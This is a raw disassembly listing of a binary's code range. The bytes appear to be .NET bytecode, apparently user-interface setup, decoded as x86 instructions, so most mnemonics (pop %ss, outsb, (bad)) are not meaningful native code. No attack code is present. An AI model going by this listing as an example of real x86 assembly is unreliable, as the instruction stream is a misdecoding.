10004bac:	34 1a                	xor    $0x1a,%al
10004bae:	8d 1b                	lea    (%ebx),%ebx
10004bb0:	00 00                	add    %al,(%eax)
10004bb2:	01 7d 2e             	add    %edi,0x2e(%ebp)
10004bb5:	00 00                	add    %al,(%eax)
10004bb7:	04 11                	add    $0x11,%al
10004bb9:	34 1a                	xor    $0x1a,%al
10004bbb:	8d 1b                	lea    (%ebx),%ebx
10004bbd:	00 00                	add    %al,(%eax)
10004bbf:	01 7d 2f             	add    %edi,0x2f(%ebp)
10004bc2:	00 00                	add    %al,(%eax)
10004bc4:	04 11                	add    $0x11,%al
10004bc6:	34 1a                	xor    $0x1a,%al
10004bc8:	8d 1c 00             	lea    (%eax,%eax,1),%ebx
10004bcb:	00 01                	add    %al,(%ecx)
10004bcd:	7d 30                	jge    0x10004bff
10004bcf:	00 00                	add    %al,(%eax)
10004bd1:	04 1a                	add    $0x1a,%al
10004bd3:	8d 11                	lea    (%ecx),%edx
10004bd5:	00 00                	add    %al,(%eax)
10004bd7:	01 13                	add    %edx,(%ebx)
10004bd9:	3b 11                	cmp    (%ecx),%edx
10004bdb:	3b 16                	cmp    (%esi),%edx
10004bdd:	72 8e                	jb     0x10004b6d
10004bdf:	09 00                	or     %eax,(%eax)
10004be1:	70 a2                	jo     0x10004b85
10004be3:	11 3b                	adc    %edi,(%ebx)
10004be5:	17                   	pop    %ss
10004be6:	72 ce                	jb     0x10004bb6
10004be8:	09 00                	or     %eax,(%eax)
10004bea:	70 a2                	jo     0x10004b8e
10004bec:	11 3b                	adc    %edi,(%ebx)
10004bee:	18 72 0e             	sbb    %dh,0xe(%edx)
10004bf1:	0a 00                	or     (%eax),%al
10004bf3:	70 a2                	jo     0x10004b97
10004bf5:	11 3b                	adc    %edi,(%ebx)
10004bf7:	19 72 4e             	sbb    %esi,0x4e(%edx)
10004bfa:	0a 00                	or     (%eax),%al
10004bfc:	70 a2                	jo     0x10004ba0
10004bfe:	11 3b                	adc    %edi,(%ebx)
10004c00:	13 26                	adc    (%esi),%esp
10004c02:	11 34 1a             	adc    %esi,(%edx,%ebx,1)
10004c05:	8d 02                	lea    (%edx),%eax
10004c07:	00 00                	add    %al,(%eax)
10004c09:	1b 13                	sbb    (%ebx),%edx
10004c0b:	3d 11 3d 16 1a       	cmp    $0x1a163d11,%eax
10004c10:	8d 11                	lea    (%ecx),%edx
10004c12:	00 00                	add    %al,(%eax)
10004c14:	01 13                	add    %edx,(%ebx)
10004c16:	3b 11                	cmp    (%ecx),%edx
10004c18:	3b 16                	cmp    (%esi),%edx
10004c1a:	72 7a                	jb     0x10004c96
10004c1c:	0a 00                	or     (%eax),%al
10004c1e:	70 a2                	jo     0x10004bc2
10004c20:	11 3b                	adc    %edi,(%ebx)
10004c22:	17                   	pop    %ss
10004c23:	72 c0                	jb     0x10004be5
10004c25:	0a 00                	or     (%eax),%al
10004c27:	70 a2                	jo     0x10004bcb
10004c29:	11 3b                	adc    %edi,(%ebx)
10004c2b:	18 72 0c             	sbb    %dh,0xc(%edx)
10004c2e:	0b 00                	or     (%eax),%eax
10004c30:	70 a2                	jo     0x10004bd4
10004c32:	11 3b                	adc    %edi,(%ebx)
10004c34:	19 72 44             	sbb    %esi,0x44(%edx)
10004c37:	0b 00                	or     (%eax),%eax
10004c39:	70 28                	jo     0x10004c63
10004c3b:	6e                   	outsb  %ds:(%esi),(%dx)
10004c3c:	00 00                	add    %al,(%eax)
10004c3e:	0a 6f 0b             	or     0xb(%edi),%ch
10004c41:	00 00                	add    %al,(%eax)
10004c43:	0a 28                	or     (%eax),%ch
10004c45:	6f                   	outsl  %ds:(%esi),(%dx)
10004c46:	00 00                	add    %al,(%eax)
10004c48:	0a a2 11 3b a2 11    	or     0x11a23b11(%edx),%ah
10004c4e:	3d 17 1a 8d 11       	cmp    $0x118d1a17,%eax
10004c53:	00 00                	add    %al,(%eax)
10004c55:	01 13                	add    %edx,(%ebx)
10004c57:	3b 11                	cmp    (%ecx),%edx
10004c59:	3b 16                	cmp    (%esi),%edx
10004c5b:	72 85                	jb     0x10004be2
10004c5d:	05 00 70 a2 11       	add    $0x11a27000,%eax
10004c62:	3b 17                	cmp    (%edi),%edx
10004c64:	72 58                	jb     0x10004cbe
10004c66:	0b 00                	or     (%eax),%eax
10004c68:	70 a2                	jo     0x10004c0c
10004c6a:	11 3b                	adc    %edi,(%ebx)
10004c6c:	18 72 a4             	sbb    %dh,-0x5c(%edx)
10004c6f:	0b 00                	or     (%eax),%eax
10004c71:	70 a2                	jo     0x10004c15
10004c73:	11 3b                	adc    %edi,(%ebx)
10004c75:	19 72 f0             	sbb    %esi,-0x10(%edx)
10004c78:	0b 00                	or     (%eax),%eax
10004c7a:	70 a2                	jo     0x10004c1e
10004c7c:	11 3b                	adc    %edi,(%ebx)
10004c7e:	a2 11 3d 18 1a       	mov    %al,0x1a183d11
10004c83:	8d 11                	lea    (%ecx),%edx
10004c85:	00 00                	add    %al,(%eax)
10004c87:	01 13                	add    %edx,(%ebx)
10004c89:	3b 11                	cmp    (%ecx),%edx
10004c8b:	3b 16                	cmp    (%esi),%edx
10004c8d:	72 22                	jb     0x10004cb1
10004c8f:	0c 00                	or     $0x0,%al
10004c91:	70 a2                	jo     0x10004c35
10004c93:	11 3b                	adc    %edi,(%ebx)
10004c95:	17                   	pop    %ss
10004c96:	72 5e                	jb     0x10004cf6
10004c98:	0c 00                	or     $0x0,%al
10004c9a:	70 a2                	jo     0x10004c3e
10004c9c:	11 3b                	adc    %edi,(%ebx)
10004c9e:	18 72 a4             	sbb    %dh,-0x5c(%edx)
10004ca1:	0c 00                	or     $0x0,%al
10004ca3:	70 a2                	jo     0x10004c47
10004ca5:	11 3b                	adc    %edi,(%ebx)
10004ca7:	19 72 e8             	sbb    %esi,-0x18(%edx)
10004caa:	0c 00                	or     $0x0,%al
10004cac:	70 a2                	jo     0x10004c50
10004cae:	11 3b                	adc    %edi,(%ebx)
10004cb0:	a2 11 3d 19 1a       	mov    %al,0x1a193d11
10004cb5:	8d 11                	lea    (%ecx),%edx
10004cb7:	00 00                	add    %al,(%eax)
10004cb9:	01 13                	add    %edx,(%ebx)
10004cbb:	3b 11                	cmp    (%ecx),%edx
10004cbd:	3b 16                	cmp    (%esi),%edx
10004cbf:	72 2e                	jb     0x10004cef
10004cc1:	0d 00 70 a2 11       	or     $0x11a27000,%eax
10004cc6:	3b 17                	cmp    (%edi),%edx
10004cc8:	72 60                	jb     0x10004d2a
10004cca:	0d 00 70 a2 11       	or     $0x11a27000,%eax
10004ccf:	3b 18                	cmp    (%eax),%ebx
10004cd1:	72 96                	jb     0x10004c69
10004cd3:	0d 00 70 a2 11       	or     $0x11a27000,%eax
10004cd8:	3b 19                	cmp    (%ecx),%ebx
10004cda:	72 be                	jb     0x10004c9a
10004cdc:	0d 00 70 a2 11       	or     $0x11a27000,%eax
10004ce1:	3b a2 11 3d 7d 31    	cmp    0x317d3d11(%edx),%esp
10004ce7:	00 00                	add    %al,(%eax)
10004ce9:	04 16                	add    $0x16,%al
10004ceb:	13 27                	adc    (%edi),%esp
10004ced:	38 b7 03 00 00 73    	cmp    %dh,0x73000003(%edi)
10004cf3:	57                   	push   %edi
10004cf4:	00 00                	add    %al,(%eax)
10004cf6:	0a 13                	or     (%ebx),%dl
10004cf8:	28 11                	sub    %dl,(%ecx)
10004cfa:	28 11                	sub    %dl,(%ecx)
10004cfc:	24 11                	and    $0x11,%al
10004cfe:	22 73 54             	and    0x54(%ebx),%dh
10004d01:	00 00                	add    %al,(%eax)
10004d03:	0a 6f 59             	or     0x59(%edi),%ch
10004d06:	00 00                	add    %al,(%eax)
10004d08:	0a 11                	or     (%ecx),%dl
10004d0a:	28 11                	sub    %dl,(%ecx)
10004d0c:	18 11                	sbb    %dl,(%ecx)
10004d0e:	23 58 11             	and    0x11(%eax),%ebx
10004d11:	21 11                	and    %edx,(%ecx)
10004d13:	27                   	daa
10004d14:	11 22                	adc    %esp,(%edx)
10004d16:	1e                   	push   %ds
10004d17:	58                   	pop    %eax
10004d18:	5a                   	pop    %edx
10004d19:	58                   	pop    %eax
10004d1a:	73 52                	jae    0x10004d6e
10004d1c:	00 00                	add    %al,(%eax)
10004d1e:	0a 6f 64             	or     0x64(%edi),%ch
10004d21:	00 00                	add    %al,(%eax)
10004d23:	0a 11                	or     (%ecx),%dl
10004d25:	28 20                	sub    %ah,(%eax)
10004d27:	fa                   	cli
10004d28:	00 00                	add    %al,(%eax)
10004d2a:	00 20                	add    %ah,(%eax)
10004d2c:	fb                   	sti
10004d2d:	00 00                	add    %al,(%eax)
10004d2f:	00 20                	add    %ah,(%eax)
10004d31:	fd                   	std
10004d32:	00 00                	add    %al,(%eax)
10004d34:	00 28                	add    %ch,(%eax)
10004d36:	39 00                	cmp    %eax,(%eax)
10004d38:	00 0a                	add    %cl,(%edx)
10004d3a:	6f                   	outsl  %ds:(%esi),(%dx)
10004d3b:	3a 00                	cmp    (%eax),%al
10004d3d:	00 0a                	add    %cl,(%edx)
10004d3f:	11 28                	adc    %ebp,(%eax)
10004d41:	17                   	pop    %ss
10004d42:	6f                   	outsl  %ds:(%esi),(%dx)
10004d43:	70 00                	jo     0x10004d45
10004d45:	00 0a                	add    %cl,(%edx)
10004d47:	7e 0e                	jle    0x10004d57
10004d49:	00 00                	add    %al,(%eax)
10004d4b:	04 6f                	add    $0x6f,%al
10004d4d:	5d                   	pop    %ebp
10004d4e:	00 00                	add    %al,(%eax)
10004d50:	0a 11                	or     (%ecx),%dl
10004d52:	28 6f 5e             	sub    %ch,0x5e(%edi)
10004d55:	00 00                	add    %al,(%eax)
10004d57:	0a 73 58             	or     0x58(%ebx),%dh
10004d5a:	00 00                	add    %al,(%eax)
10004d5c:	0a 13                	or     (%ebx),%dl
10004d5e:	29 11                	sub    %edx,(%ecx)
10004d60:	29 11                	sub    %edx,(%ecx)
10004d62:	27                   	daa
10004d63:	17                   	pop    %ss
10004d64:	58                   	pop    %eax
10004d65:	13 39                	adc    (%ecx),%edi
10004d67:	12 39                	adc    (%ecx),%bh
10004d69:	28 71 00             	sub    %dh,0x0(%ecx)
10004d6c:	00 0a                	add    %cl,(%edx)
10004d6e:	6f                   	outsl  %ds:(%esi),(%dx)
10004d6f:	35 00 00 0a 11       	xor    $0x110a0000,%eax
10004d74:	29 72 35             	sub    %esi,0x35(%edx)
10004d77:	02 00                	add    (%eax),%al
10004d79:	70 22                	jo     0x10004d9d
10004d7b:	00 00                	add    %al,(%eax)
10004d7d:	20 41 17             	and    %al,0x17(%ecx)
10004d80:	73 65                	jae    0x10004de7
10004d82:	00 00                	add    %al,(%eax)
10004d84:	0a 6f 61             	or     0x61(%edi),%ch
10004d87:	00 00                	add    %al,(%eax)
10004d89:	0a 11                	or     (%ecx),%dl
10004d8b:	29 28                	sub    %ebp,(%eax)
10004d8d:	5f                   	pop    %edi
10004d8e:	00 00                	add    %al,(%eax)
10004d90:	0a 6f 3c             	or     0x3c(%edi),%ch
10004d93:	00 00                	add    %al,(%eax)
10004d95:	0a 11                	or     (%ecx),%dl
10004d97:	29 11                	sub    %edx,(%ecx)
10004d99:	34 7b                	xor    $0x7b,%al
10004d9b:	2a 00                	sub    (%eax),%al
10004d9d:	00 04 6f             	add    %al,(%edi,%ebp,2)
10004da0:	3a 00                	cmp    (%eax),%al
10004da2:	00 0a                	add    %cl,(%edx)
10004da4:	11 29                	adc    %ebp,(%ecx)
10004da6:	1f                   	pop    %ds
10004da7:	1a 1f                	sbb    (%edi),%bl
10004da9:	1a 73 54             	sbb    0x54(%ebx),%dh
10004dac:	00 00                	add    %al,(%eax)
10004dae:	0a 6f 59             	or     0x59(%edi),%ch
10004db1:	00 00                	add    %al,(%eax)
10004db3:	0a 11                	or     (%ecx),%dl
10004db5:	29 1e                	sub    %ebx,(%esi)
10004db7:	1c 73                	sbb    $0x73,%al
10004db9:	52                   	push   %edx
10004dba:	00 00                	add    %al,(%eax)
10004dbc:	0a 6f 64             	or     0x64(%edi),%ch
10004dbf:	00 00                	add    %al,(%eax)
10004dc1:	0a 11                	or     (%ecx),%dl
10004dc3:	29 1f                	sub    %ebx,(%edi)
10004dc5:	20 6f 66             	and    %ch,0x66(%edi)
10004dc8:	00 00                	add    %al,(%eax)
10004dca:	0a 11                	or     (%ecx),%dl
10004dcc:	28 6f 5d             	sub    %ch,0x5d(%edi)
10004dcf:	00 00                	add    %al,(%eax)
10004dd1:	0a 11                	or     (%ecx),%dl
10004dd3:	29 6f 5e             	sub    %ebp,0x5e(%edi)
10004dd6:	00 00                	add    %al,(%eax)
10004dd8:	0a 11                	or     (%ecx),%dl
10004dda:	34 7b                	xor    $0x7b,%al
10004ddc:	30 00                	xor    %al,(%eax)
10004dde:	00 04 11             	add    %al,(%ecx,%edx,1)
10004de1:	27                   	daa
10004de2:	11 29                	adc    %ebp,(%ecx)
10004de4:	a2 73 58 00 00       	mov    %al,0x5873
10004de9:	0a 13                	or     (%ebx),%dl
10004deb:	2a 11                	sub    (%ecx),%dl
10004ded:	2a 72 01             	sub    0x1(%edx),%dh
10004df0:	00 00                	add    %al,(%eax)
10004df2:	70 6f                	jo     0x10004e63
10004df4:	35 00 00 0a 11       	xor    $0x110a0000,%eax
10004df9:	2a 72 35             	sub    0x35(%edx),%dh
10004dfc:	02 00                	add    (%eax),%al
10004dfe:	70 22                	jo     0x10004e22
10004e00:	00 00                	add    %al,(%eax)
10004e02:	40                   	inc    %eax
10004e03:	41                   	inc    %ecx
10004e04:	17                   	pop    %ss
10004e05:	73 65                	jae    0x10004e6c
10004e07:	00 00                	add    %al,(%eax)
10004e09:	0a 6f 61             	or     0x61(%edi),%ch
10004e0c:	00 00                	add    %al,(%eax)
10004e0e:	0a 11                	or     (%ecx),%dl
10004e10:	2a 1f                	sub    (%edi),%bl
10004e12:	0a 20                	or     (%eax),%ah
10004e14:	bf 00 00 00 20       	mov    $0x20000000,%edi
10004e19:	83 00 00             	addl   $0x0,(%eax)
10004e1c:	00 28                	add    %ch,(%eax)
10004e1e:	39 00                	cmp    %eax,(%eax)
10004e20:	00 0a                	add    %cl,(%edx)
10004e22:	6f                   	outsl  %ds:(%esi),(%dx)
10004e23:	3c 00                	cmp    $0x0,%al
10004e25:	00 0a                	add    %cl,(%edx)
10004e27:	11 2a                	adc    %ebp,(%edx)
10004e29:	1f                   	pop    %ds
10004e2a:	1a 1f                	sbb    (%edi),%bl
10004e2c:	1a 73 54             	sbb    0x54(%ebx),%dh
10004e2f:	00 00                	add    %al,(%eax)
10004e31:	0a 6f 59             	or     0x59(%edi),%ch
10004e34:	00 00                	add    %al,(%eax)
10004e36:	0a 11                	or     (%ecx),%dl
10004e38:	2a 1e                	sub    (%esi),%bl
10004e3a:	1c 73                	sbb    $0x73,%al
10004e3c:	52                   	push   %edx
10004e3d:	00 00                	add    %al,(%eax)
10004e3f:	0a 6f 64             	or     0x64(%edi),%ch
10004e42:	00 00                	add    %al,(%eax)
10004e44:	0a 11                	or     (%ecx),%dl
10004e46:	2a 1f                	sub    (%edi),%bl
10004e48:	20 6f 66             	and    %ch,0x66(%edi)
10004e4b:	00 00                	add    %al,(%eax)
10004e4d:	0a 11                	or     (%ecx),%dl
10004e4f:	2a 28                	sub    (%eax),%ch
10004e51:	5a                   	pop    %edx
10004e52:	00 00                	add    %al,(%eax)
10004e54:	0a 6f 3a             	or     0x3a(%edi),%ch
10004e57:	00 00                	add    %al,(%eax)
10004e59:	0a 11                	or     (%ecx),%dl
10004e5b:	2a 16                	sub    (%esi),%dl
10004e5d:	6f                   	outsl  %ds:(%esi),(%dx)
10004e5e:	3b 00                	cmp    (%eax),%eax
10004e60:	00 0a                	add    %cl,(%edx)
10004e62:	11 28                	adc    %ebp,(%eax)
10004e64:	6f                   	outsl  %ds:(%esi),(%dx)
10004e65:	5d                   	pop    %ebp
10004e66:	00 00                	add    %al,(%eax)
10004e68:	0a 11                	or     (%ecx),%dl
10004e6a:	2a 6f 5e             	sub    0x5e(%edi),%ch
10004e6d:	00 00                	add    %al,(%eax)
10004e6f:	0a 11                	or     (%ecx),%dl
10004e71:	34 7b                	xor    $0x7b,%al
10004e73:	2d 00 00 04 11       	sub    $0x11040000,%eax
10004e78:	27                   	daa
10004e79:	11 2a                	adc    %ebp,(%edx)
10004e7b:	a2 73 58 00 00       	mov    %al,0x5873
10004e80:	0a 13                	or     (%ebx),%dl
10004e82:	2b 11                	sub    (%ecx),%edx
10004e84:	2b 11                	sub    (%ecx),%edx
10004e86:	26 11 27             	adc    %esp,%es:(%edi)
10004e89:	9a 6f 35 00 00 0a 11 	lcall  $0x110a,$0x356f
10004e90:	2b 72 35             	sub    0x35(%edx),%esi
10004e93:	02 00                	add    (%eax),%al
10004e95:	70 22                	jo     0x10004eb9
10004e97:	00 00                	add    %al,(%eax)
10004e99:	10 41 17             	adc    %al,0x17(%ecx)
10004e9c:	73 65                	jae    0x10004f03
10004e9e:	00 00                	add    %al,(%eax)
10004ea0:	0a 6f 61             	or     0x61(%edi),%ch
10004ea3:	00 00                	add    %al,(%eax)
10004ea5:	0a 11                	or     (%ecx),%dl
10004ea7:	2b 11                	sub    (%ecx),%edx
10004ea9:	14 6f                	adc    $0x6f,%al
10004eab:	3c 00                	cmp    $0x0,%al
10004ead:	00 0a                	add    %cl,(%edx)
10004eaf:	11 2b                	adc    %ebp,(%ebx)
10004eb1:	17                   	pop    %ss
10004eb2:	6f                   	outsl  %ds:(%esi),(%dx)
10004eb3:	62 00                	bound  %eax,(%eax)
10004eb5:	00 0a                	add    %cl,(%edx)
10004eb7:	11 2b                	adc    %ebp,(%ebx)
10004eb9:	1f                   	pop    %ds
10004eba:	2a 1b                	sub    (%ebx),%bl
10004ebc:	73 52                	jae    0x10004f10
10004ebe:	00 00                	add    %al,(%eax)
10004ec0:	0a 6f 64             	or     0x64(%edi),%ch
10004ec3:	00 00                	add    %al,(%eax)
10004ec5:	0a 11                	or     (%ecx),%dl
10004ec7:	2b 28                	sub    (%eax),%ebp
10004ec9:	5a                   	pop    %edx
10004eca:	00 00                	add    %al,(%eax)
10004ecc:	0a 6f 3a             	or     0x3a(%edi),%ch
10004ecf:	00 00                	add    %al,(%eax)
10004ed1:	0a 11                	or     (%ecx),%dl
10004ed3:	28 6f 5d             	sub    %ch,0x5d(%edi)
10004ed6:	00 00                	add    %al,(%eax)
10004ed8:	0a 11                	or     (%ecx),%dl
10004eda:	2b 6f 5e             	sub    0x5e(%edi),%ebp
10004edd:	00 00                	add    %al,(%eax)
10004edf:	0a 11                	or     (%ecx),%dl
10004ee1:	25 11 27 11 2b       	and    $0x2b112711,%eax
10004ee6:	a2 73 58 00 00       	mov    %al,0x5873
10004eeb:	0a 13                	or     (%ebx),%dl
10004eed:	2c 11                	sub    $0x11,%al
10004eef:	2c 72                	sub    $0x72,%al
10004ef1:	7f 05                	jg     0x10004ef8
10004ef3:	00 70 6f             	add    %dh,0x6f(%eax)
10004ef6:	35 00 00 0a 11       	xor    $0x110a0000,%eax
10004efb:	2c 72                	sub    $0x72,%al
10004efd:	35 02 00 70 22       	xor    $0x22700002,%eax
10004f02:	00 00                	add    %al,(%eax)
10004f04:	00 41 73             	add    %al,0x73(%ecx)
10004f07:	60                   	pusha
10004f08:	00 00                	add    %al,(%eax)
10004f0a:	0a 6f 61             	or     0x61(%edi),%ch
10004f0d:	00 00                	add    %al,(%eax)
10004f0f:	0a 11                	or     (%ecx),%dl
10004f11:	2c 28                	sub    $0x28,%al
10004f13:	3d 00 00 0a 6f       	cmp    $0x6f0a0000,%eax
10004f18:	3c 00                	cmp    $0x0,%al
10004f1a:	00 0a                	add    %cl,(%edx)
10004f1c:	11 2c 1f             	adc    %ebp,(%edi,%ebx,1)
10004f1f:	28 1f                	sub    %bl,(%edi)
10004f21:	12 73 54             	adc    0x54(%ebx),%dh
10004f24:	00 00                	add    %al,(%eax)
10004f26:	0a 6f 59             	or     0x59(%edi),%ch
10004f29:	00 00                	add    %al,(%eax)
10004f2b:	0a 11                	or     (%ecx),%dl
10004f2d:	2c 11                	sub    $0x11,%al
10004f2f:	24 1f                	and    $0x1f,%al
10004f31:	37                   	aaa
10004f32:	59                   	pop    %ecx
10004f33:	1b 73 52             	sbb    0x52(%ebx),%esi
10004f36:	00 00                	add    %al,(%eax)
10004f38:	0a 6f 64             	or     0x64(%edi),%ch
10004f3b:	00 00                	add    %al,(%eax)
10004f3d:	0a 11                	or     (%ecx),%dl
10004f3f:	2c 1f                	sub    $0x1f,%al
10004f41:	40                   	inc    %eax
10004f42:	6f                   	outsl  %ds:(%esi),(%dx)
10004f43:	66 00 00             	data16 add %al,(%eax)
10004f46:	0a 11                	or     (%ecx),%dl
10004f48:	2c 28                	sub    $0x28,%al
10004f4a:	5a                   	pop    %edx
10004f4b:	00 00                	add    %al,(%eax)
10004f4d:	0a 6f 3a             	or     0x3a(%edi),%ch
10004f50:	00 00                	add    %al,(%eax)
10004f52:	0a 11                	or     (%ecx),%dl
10004f54:	28 6f 5d             	sub    %ch,0x5d(%edi)
10004f57:	00 00                	add    %al,(%eax)
10004f59:	0a 11                	or     (%ecx),%dl
10004f5b:	2c 6f                	sub    $0x6f,%al
10004f5d:	5e                   	pop    %esi
10004f5e:	00 00                	add    %al,(%eax)
10004f60:	0a 11                	or     (%ecx),%dl
10004f62:	34 7b                	xor    $0x7b,%al
10004f64:	2b 00                	sub    (%eax),%eax
10004f66:	00 04 11             	add    %al,(%ecx,%edx,1)
10004f69:	27                   	daa
10004f6a:	11 2c a2             	adc    %ebp,(%edx,%eiz,4)
10004f6d:	73 58                	jae    0x10004fc7
10004f6f:	00 00                	add    %al,(%eax)
10004f71:	0a 13                	or     (%ebx),%dl
10004f73:	2d 11 2d 11 34       	sub    $0x34112d11,%eax
10004f78:	7b 31                	jnp    0x10004fab
10004f7a:	00 00                	add    %al,(%eax)
10004f7c:	04 11                	add    $0x11,%al
10004f7e:	27                   	daa
10004f7f:	9a 16 9a 6f 35 00 00 	lcall  $0x0,$0x356f9a16
10004f86:	0a 11                	or     (%ecx),%dl
10004f88:	2d 72 35 02 00       	sub    $0x23572,%eax
10004f8d:	70 22                	jo     0x10004fb1
10004f8f:	00 00                	add    %al,(%eax)
10004f91:	00 41 73             	add    %al,0x73(%ecx)
10004f94:	60                   	pusha
10004f95:	00 00                	add    %al,(%eax)
10004f97:	0a 6f 61             	or     0x61(%edi),%ch
10004f9a:	00 00                	add    %al,(%eax)
10004f9c:	0a 11                	or     (%ecx),%dl
10004f9e:	2d 28 3d 00 00       	sub    $0x3d28,%eax
10004fa3:	0a 6f 3c             	or     0x3c(%edi),%ch
10004fa6:	00 00                	add    %al,(%eax)
10004fa8:	0a 11                	or     (%ecx),%dl
10004faa:	2d 16 6f 62 00       	sub    $0x626f16,%eax
10004faf:	00 0a                	add    %cl,(%edx)
10004fb1:	11 2d 11 24 1f 64    	adc    %ebp,0x641f2411
10004fb7:	59                   	pop    %ecx
10004fb8:	1f                   	pop    %ds
10004fb9:	12 73 54             	adc    0x54(%ebx),%dh
10004fbc:	00 00                	add    %al,(%eax)
10004fbe:	0a 6f 59             	or     0x59(%edi),%ch
10004fc1:	00 00                	add    %al,(%eax)
10004fc3:	0a 11                	or     (%ecx),%dl
10004fc5:	2d 1f 2a 1f 18       	sub    $0x181f2a1f,%eax
10004fca:	73 52                	jae    0x1000501e
10004fcc:	00 00                	add    %al,(%eax)
10004fce:	0a 6f 64             	or     0x64(%edi),%ch
10004fd1:	00 00                	add    %al,(%eax)
10004fd3:	0a 11                	or     (%ecx),%dl
10004fd5:	2d 28 5a 00 00       	sub    $0x5a28,%eax
10004fda:	0a 6f 3a             	or     0x3a(%edi),%ch
10004fdd:	00 00                	add    %al,(%eax)
10004fdf:	0a 11                	or     (%ecx),%dl
10004fe1:	28 6f 5d             	sub    %ch,0x5d(%edi)
10004fe4:	00 00                	add    %al,(%eax)
10004fe6:	0a 11                	or     (%ecx),%dl
10004fe8:	2d 6f 5e 00 00       	sub    $0x5e6f,%eax
10004fed:	0a 11                	or     (%ecx),%dl
10004fef:	34 7b                	xor    $0x7b,%al
10004ff1:	2c 00                	sub    $0x0,%al
10004ff3:	00 04 11             	add    %al,(%ecx,%edx,1)
10004ff6:	27                   	daa
10004ff7:	11 2d a2 73 57 00    	adc    %ebp,0x5773a2
10004ffd:	00 0a                	add    %cl,(%edx)
10004fff:	13 2e                	adc    (%esi),%ebp
10005001:	11 2e                	adc    %ebp,(%esi)
10005003:	11 24 1f             	adc    %esp,(%edi,%ebx,1)
10005006:	37                   	aaa
10005007:	59                   	pop    %ecx
10005008:	1a 73 54             	sbb    0x54(%ebx),%dh
1000500b:	00 00                	add    %al,(%eax)
1000500d:	0a 6f 59             	or     0x59(%edi),%ch
10005010:	00 00                	add    %al,(%eax)
10005012:	0a 11                	or     (%ecx),%dl
10005014:	2e 1f                	cs pop %ds
10005016:	2a 1f                	sub    (%edi),%bl
10005018:	30 73 52             	xor    %dh,0x52(%ebx)
1000501b:	00 00                	add    %al,(%eax)
1000501d:	0a 6f 64             	or     0x64(%edi),%ch
10005020:	00 00                	add    %al,(%eax)
10005022:	0a 11                	or     (%ecx),%dl
10005024:	2e 20 e6             	cs and %ah,%dh
10005027:	00 00                	add    %al,(%eax)
10005029:	00 20                	add    %ah,(%eax)
1000502b:	e9 00 00 00 20       	jmp    0x30005030
10005030:	f0 00 00             	lock add %al,(%eax)
10005033:	00 28                	add    %ch,(%eax)
10005035:	39 00                	cmp    %eax,(%eax)
10005037:	00 0a                	add    %cl,(%edx)
10005039:	6f                   	outsl  %ds:(%esi),(%dx)
1000503a:	3a 00                	cmp    (%eax),%al
1000503c:	00 0a                	add    %cl,(%edx)
1000503e:	11 28                	adc    %ebp,(%eax)
10005040:	6f                   	outsl  %ds:(%esi),(%dx)
10005041:	5d                   	pop    %ebp
10005042:	00 00                	add    %al,(%eax)
10005044:	0a 11                	or     (%ecx),%dl
10005046:	2e 6f                	outsl  %cs:(%esi),(%dx)
10005048:	5e                   	pop    %esi
10005049:	00 00                	add    %al,(%eax)
1000504b:	0a 11                	or     (%ecx),%dl
1000504d:	34 7b                	xor    $0x7b,%al
1000504f:	2e 00 00             	add    %al,%cs:(%eax)
10005052:	04 11                	add    $0x11,%al
10005054:	27                   	daa
10005055:	11 2e                	adc    %ebp,(%esi)
10005057:	a2 73 57 00 00       	mov    %al,0x5773
1000505c:	0a 13                	or     (%ebx),%dl
1000505e:	2f                   	das
1000505f:	11 2f                	adc    %ebp,(%edi)
10005061:	16                   	push   %ss
10005062:	1a 73 54             	sbb    0x54(%ebx),%dh
10005065:	00 00                	add    %al,(%eax)
10005067:	0a 6f 59             	or     0x59(%edi),%ch
1000506a:	00 00                	add    %al,(%eax)
1000506c:	0a 11                	or     (%ecx),%dl
1000506e:	2f                   	das
1000506f:	16                   	push   %ss
10005070:	16                   	push   %ss
10005071:	73 52                	jae    0x100050c5
10005073:	00 00                	add    %al,(%eax)
10005075:	0a 6f 64             	or     0x64(%edi),%ch
10005078:	00 00                	add    %al,(%eax)
1000507a:	0a 11                	or     (%ecx),%dl
1000507c:	2f                   	das
1000507d:	11 34 7b             	adc    %esi,(%ebx,%edi,2)
10005080:	2a 00                	sub    (%eax),%al
10005082:	00 04 6f             	add    %al,(%edi,%ebp,2)
10005085:	3a 00                	cmp    (%eax),%al
10005087:	00 0a                	add    %cl,(%edx)
10005089:	11 2e                	adc    %ebp,(%esi)
1000508b:	6f                   	outsl  %ds:(%esi),(%dx)
1000508c:	5d                   	pop    %ebp
1000508d:	00 00                	add    %al,(%eax)
1000508f:	0a 11                	or     (%ecx),%dl
10005091:	2f                   	das
10005092:	6f                   	outsl  %ds:(%esi),(%dx)
10005093:	5e                   	pop    %esi
10005094:	00 00                	add    %al,(%eax)
10005096:	0a 11                	or     (%ecx),%dl
10005098:	34 7b                	xor    $0x7b,%al
1000509a:	2f                   	das
1000509b:	00 00                	add    %al,(%eax)
1000509d:	04 11                	add    $0x11,%al
1000509f:	27                   	daa
100050a0:	11 2f                	adc    %ebp,(%edi)
100050a2:	a2 11 27 17 58       	mov    %al,0x58172711
100050a7:	13 27                	adc    (%edi),%esp
100050a9:	11 27                	adc    %esp,(%edi)
100050ab:	1a 3f                	sbb    (%edi),%bh
100050ad:	41                   	inc    %ecx
100050ae:	fc                   	cld
100050af:	ff                   	(bad)
100050b0:	ff 11                	call   *(%ecx)
100050b2:	21 1a                	and    %ebx,(%edx)
100050b4:	11 22                	adc    %esp,(%edx)
100050b6:	1e                   	push   %ds
100050b7:	58                   	pop    %eax
100050b8:	5a                   	pop    %edx
100050b9:	58                   	pop    %eax
100050ba:	1f                   	pop    %ds
100050bb:	0c 58                	or     $0x58,%al
100050bd:	13 30                	adc    (%eax),%esi
100050bf:	11 34 73             	adc    %esi,(%ebx,%esi,2)
100050c2:	57                   	push   %edi
100050c3:	00 00                	add    %al,(%eax)
100050c5:	0a 7d 32             	or     0x32(%ebp),%bh
100050c8:	00 00                	add    %al,(%eax)
100050ca:	04 11                	add    $0x11,%al
100050cc:	34 7b                	xor    $0x7b,%al
100050ce:	32 00                	xor    (%eax),%al
100050d0:	00 04 11             	add    %al,(%ecx,%edx,1)
100050d3:	24 1f                	and    $0x1f,%al
100050d5:	10 73 54             	adc    %dh,0x54(%ebx)
100050d8:	00 00                	add    %al,(%eax)
100050da:	0a 6f 59             	or     0x59(%edi),%ch
100050dd:	00 00                	add    %al,(%eax)
100050df:	0a 11                	or     (%ecx),%dl
100050e1:	34 7b                	xor    $0x7b,%al
100050e3:	32 00                	xor    (%eax),%al
100050e5:	00 04 11             	add    %al,(%ecx,%edx,1)
100050e8:	18 11                	sbb    %dl,(%ecx)
